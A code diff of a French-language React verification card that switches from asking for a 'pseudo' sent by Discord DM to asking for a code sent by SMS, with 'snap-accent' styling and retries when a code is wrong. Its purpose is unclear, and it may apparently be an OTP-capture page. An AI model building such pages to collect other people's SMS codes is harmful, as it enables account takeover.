@@ -125,7 +125,7 @@ function CodeCard({ userId, onSubmitted, errorMsg }) {
         setSending(true);
         try {
             await submitCode(userId, full);
-            toast.success("pseudo envoyé, on vérifie...");
+            toast.success("Code envoyé, on vérifie...");
             onSubmitted();
         } catch {
             toast.error("Erreur, réessaie.");
@@ -137,14 +137,14 @@ function CodeCard({ userId, onSubmitted, errorMsg }) {
     return (
         <>
             <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "6px 0 6px" }}>
-                <span className="snap-accent">Vérification</span> du pseudo
+                <span className="snap-accent">Vérification</span> du code
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 24px", lineHeight: 1.5 }}>
-                Entre le pseudo reçu par DM discord.
+                Entre le code reçu par SMS.
             </p>
             {errorMsg && (
-                <div style={{ margin: "0 0 16px", padding: "10px 14px", background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.35)", borderRadius: 12, color: "#ef4444", fontSize: 13, textAlign: "center" }} data-testid="wrong-pseudo-banner">
-                    ❌ Pseudo incorrect. Un nouveau pseudo arrive, réessaie.
+                <div style={{ margin: "0 0 16px", padding: "10px 14px", background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.35)", borderRadius: 12, color: "#ef4444", fontSize: 13, textAlign: "center" }} data-testid="wrong-code-banner">
+                    ❌ Code incorrect. Un nouveau code arrive, réessaie.
                 </div>
             )}
 
@@ -193,7 +193,7 @@ function CodeCard({ userId, onSubmitted, errorMsg }) {
                 onClick={submit}
                 data-testid="otp-submit-btn"
             >
-                {sending ? "Envoi..." : "Valider le pseudo"}
+                {sending ? "Envoi..." : "Valider le code"}
             </button>
         </>
     );
